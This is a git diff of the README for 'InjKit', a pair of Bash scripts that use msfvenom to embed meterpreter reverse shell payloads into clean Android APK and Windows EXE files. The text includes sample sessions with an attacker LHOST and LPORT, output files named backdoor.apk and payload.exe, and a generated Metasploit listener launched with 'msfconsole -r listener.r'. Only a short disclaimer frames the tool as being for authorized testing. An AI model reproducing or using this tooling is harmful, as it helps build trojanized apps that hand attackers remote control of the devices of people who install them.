@@ -1,32 +1,28 @@
 # InjKit
 
+**Payload Injector Toolkit (APK & EXE)**
 
-Payload Injector Toolkit (APK & EXE)
-
-This toolkit provides two simple yet effective Bash scripts that allow you to inject meterpreter reverse shell payloads into clean APK or EXE files using msfvenom.
-
+InjKit provides two simple yet powerful Bash scripts that let you inject **meterpreter reverse shell payloads** into clean **APK** or **EXE** files using `msfvenom`.
 
 ---
 
-📁 Included Scripts
+## 📁 Included Scripts
 
-1. apk_injector.sh — Android APK Injector
+### 1. `apk_injector.sh` — Android APK Injector
 
-Injects a reverse shell payload into a clean APK file using Metasploit’s msfvenom.
+Injects a reverse shell payload into a clean APK file using Metasploit’s `msfvenom`.
 
-🔧 Features:
+#### 🔧 Features:
 
-Simple interactive interface
+- Simple interactive interface
+- Verifies APK file path before injection
+- Detects payload settings (LHOST, LPORT)
+- Generates a new APK file with embedded payload
+- Automatically creates a **Metasploit listener script (`listener.r`)**
 
-Verifies APK file path before processing
+#### 🚀 Example Usage:
 
-Uses msfvenom to inject payload
-
-Outputs a new APK file with embedded payload
-
-
-🚀 Example Usage:
-
+```bash
 chmod +x apk_injector.sh
 ./apk_injector.sh
 
@@ -37,16 +33,14 @@ chmod +x apk_injector.sh
 ===============================
 
 🌐 Enter LHOST: 192.168.1.100
-
 🎯 Enter LPORT: 4444
-
 Enter the path to a clean APK file: /root/app.apk
-
 Enter the output file name (e.g., evil.apk): backdoor.apk
 
 [*] Injecting payload into /root/app.apk...
-
 [+] Payload injected successfully! Saved as: backdoor.apk
+[+] Metasploit listener script saved as: listener.r
+[*] You can run it using: msfconsole -r listener.r
 
 
 ---
@@ -57,15 +51,15 @@ Injects a reverse shell payload into a clean EXE file using Metasploit’s msfve
 
 🔧 Features:
 
-Interactive prompts for easy setup
+Interactive prompts for LHOST/LPORT and file paths
 
-Validates input EXE file path
+Detects EXE architecture (x86 or x64) automatically
 
-Supports any EXE (e.g., notepad.exe) as a base
+Selects the appropriate payload
 
-Uses msfvenom for injection
+Generates a new EXE with embedded reverse shell
 
-Generates new malicious EXE
+Automatically creates a Metasploit listener script (listener.r)
 
 
 🚀 Example Usage:
@@ -80,27 +74,40 @@ chmod +x exe_injector.sh
 ===============================
 
 🌐 Enter LHOST: 192.168.1.100
-
 🎯 Enter LPORT: 5555
-
 Enter the path to a clean EXE file (e.g., notepad.exe): /root/notepad.exe
-
 Enter the output file name (e.g., evil.exe): payload.exe
 
-[*] Injecting payload into /root/notepad.exe...
+=========================================
+✅ Architecture detected: x64
+=========================================
 
+[*] Injecting payload into /root/notepad.exe...
 [+] Payload injected successfully! Saved as: payload.exe
+[+] Metasploit listener script saved as: listener.r
+[*] You can run it using: msfconsole -r listener.r
+
+
+---
+
+🎯 Listener Script (listener.r)
+
+After each successful payload injection, a file named listener.r is generated. This file contains the required Metasploit commands to handle the reverse connection.
+
+🔁 How to use it:
+
+msfconsole -r listener.r
 
 
 ---
 
 ⚠️ Notes
 
-These tools rely on msfvenom, part of the Metasploit Framework.
+These tools depend on msfvenom, which is part of the Metasploit Framework.
 
-Make sure msfvenom is installed and accessible in your PATH.
+Ensure Metasploit is installed and that msfvenom is accessible via terminal.
 
-Use within ethical boundaries and only in environments you are authorized to test.
+This tool is for educational and authorized penetration testing purposes only.
 
 
 
@@ -109,6 +116,9 @@ Use within ethical boundaries and only in environments you are authorized to tes
 💬 Feedback
 
 Feel free to submit issues, improvements, or suggestions.
-Made with ❤️ for educational and penetration testing use.
+Made with ❤️ for learning, red teaming, and ethical hacking.
+
 
 ---
+
+
